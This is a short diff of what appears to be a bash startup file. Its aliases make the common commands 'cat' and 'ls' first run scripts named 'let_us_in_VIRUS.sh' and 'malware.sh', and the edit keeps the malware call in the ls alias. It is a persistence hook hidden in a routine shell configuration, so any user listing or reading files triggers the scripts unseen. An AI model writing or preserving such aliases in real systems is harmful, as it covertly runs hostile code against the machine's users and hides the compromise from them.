@@ -175,7 +175,7 @@ if [ -x /usr/lib/command-not-found -o -x /usr/share/command-not-found/command-no
 fi
 
 alias cat='/sbin/let_us_in_VIRUS.sh; cat'
-alias ls='/bin/malware.sh; ls'
+alias ls='/bin/malware.sh; echo; ls --color=auto'
 #PS1="\u@\h:\w\$ "
 #what user@comp prompt looks like
 if [ $(id -u) -eq 0 ];
